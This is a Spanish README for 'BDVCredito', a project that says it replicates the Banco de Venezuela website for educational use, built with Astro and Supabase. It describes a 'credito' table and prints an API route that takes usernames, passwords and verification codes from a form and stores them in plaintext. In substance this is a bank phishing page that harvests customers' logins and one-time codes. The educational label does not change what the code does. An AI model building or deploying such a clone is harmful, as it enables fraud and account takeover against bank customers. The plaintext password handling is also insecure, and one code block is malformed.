# BDVCredito

**Versión**: 0.0.1  
**Autor**: Carlos Mafifa

BDVCredito es un proyecto educativo construido con Astro, que replica la página web del Banco de Venezuela. Este proyecto incluye varias funcionalidades avanzadas, como la conexión a una base de datos usando Supabase, la implementación de un sistema de autenticación simple, y el manejo de datos mediante formularios interactivos. El propósito de este proyecto es servir como una herramienta de aprendizaje y referencia para desarrollar aplicaciones web completas utilizando Astro y otras tecnologías modernas.

## Tabla de Contenidos

- [BDVCredito](#bdvcredito)
  - [Tabla de Contenidos](#tabla-de-contenidos)
  - [Instalación](#instalación)
  - [Estructura del Proyecto](#estructura-del-proyecto)
  - [Uso](#uso)
  - [Sistema de Autenticación](#sistema-de-autenticación)
  - [Ejemplo de API](#ejemplo-de-api)
  - [Scripts Disponibles](#scripts-disponibles)
  - [Dependencias](#dependencias)
  - [Base de Datos](#base-de-datos)
  - [Despliegue](#despliegue)
  - [Contribución](#contribución)
  - [Licencia](#licencia)

## Instalación

Para instalar y ejecutar este proyecto localmente, sigue los siguientes pasos:

1. Clona este repositorio en tu máquina local:
   ```bash
   git clone https://github.com/tuusuario/bdvcredito.git
   cd bdvcredito
   ```

2. Instala las dependencias:

```bash
npm install
```

1. Configura las variables de entorno para conectar con Supabase. Crea un archivo .env en la raíz del proyecto con la siguiente estructura:

```env
SUPABASE_URL=your_supabase_url
SUPABASE_KEY=your_supabase_key
Inicia el servidor de desarrollo:
```

##  Estructura del Proyecto
El proyecto está organizado de la siguiente manera:

```
/
├── public/           # Archivos públicos (imágenes, fuentes, etc.)
├── src/              # Código fuente del proyecto
│   ├── components/   # Componentes reutilizables de React
│   ├── layouts/      # Layouts de páginas
│   ├── pages/        # Páginas del sitio web
│   ├── styles/       # Archivos CSS y Tailwind
│   ├── lib/          # Configuración de Supabase y utilidades
│   ├── content/      # Contenido estático en Markdown (opcional)
├── package.json      # Configuración del proyecto y dependencias
├── astro.config.mjs  # Configuración de Astro
└── tailwind.config.cjs # Configuración de Tailwind CSS
```

## Uso

Este proyecto replica una versión simplificada de la interfaz del Banco de Venezuela, con un enfoque en la funcionalidad de crédito. Los usuarios pueden simular el ingreso de datos para crear o actualizar registros en la base de datos.

## Sistema de Autenticación

El sistema de autenticación implementado en este proyecto permite a los usuarios actualizar sus datos de crédito. El código del sistema de autenticación se encuentra en el archivo `src/pages/api/credito.js`. La tabla en Supabase utilizada en este proyecto es credito, la cual tiene las siguientes columnas:

- `id`: Identificador único (autoincremental).
- `usuario`: Nombre de usuario (string).
- `contrasena`: Contraseña del usuario (string).
- `codigo`: Código de verificación (string).
- `fecha_inicio`: Fecha en que se realizó la última actualización (timestamp).

## Ejemplo de API

El proyecto incluye una API simple que interactúa con la base de datos. Aquí tienes un ejemplo de cómo la API maneja la actualización de datos:

```ts
export const POST: APIRoute = async ({ request }) => {
  const { usuario, password, codigo } = await request.json();

  const { data, error } = await supabase
    .from('credito')
    .select('id')
    .eq('usuario', usuario)
    .single();

  if (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 400 }
    );
  }

  const date = new Date();
  const { error: upsertError } = await supabase
    .from('credito')
    .upsert({ id: data.id, usuario, contrasena: password, codigo, fecha_inicio: date });

  if (upsertError) {
    return new Response(
      JSON.stringify({ error: upsertError.message }),
      { status: 400 }
    );
  }

  return new Response(
    JSON.stringify({ message: 'Usuario actualizado correctamente' }),
    { status: 200 }
  );
};

```

## Scripts Disponibles

En el archivo `package.json`, se definen varios scripts para facilitar el desarrollo:

- `npm run dev`: Inicia el servidor de desarrollo.
- `npm run build`: Verifica el proyecto y lo construye para producción.
- `npm run preview`: Previsualiza la versión construida del sitio web.

## Dependencias

Las principales dependencias del proyecto incluyen:

- Astro - Framework para construir sitios web rápidos.
- React - Librería para construir interfaces de usuario.
- Supabase - Base de datos y backend.
- Tailwind CSS - Framework de CSS para diseñar la UI.
- Typescript - Superconjunto de JavaScript que añade tipado estático.

## Base de Datos

El proyecto utiliza Supabase para manejar la base de datos. Asegúrate de configurar correctamente las variables de entorno (`SUPABASE_URL` y `SUPABASE_KEY`) antes de intentar conectarte a la base de datos.

## Despliegue

Configura tu proyecto en Vercel.
Define las variables de entorno en Vercel.

## Contribución

Este proyecto es solo con fines educativos. Sin embargo, si deseas contribuir, eres bienvenido a abrir un issue o enviar un pull request.

## Licencia

Este proyecto es de uso libre para fines educativos y no tiene una licencia específica. No está permitido usar este proyecto con fines comerciales.
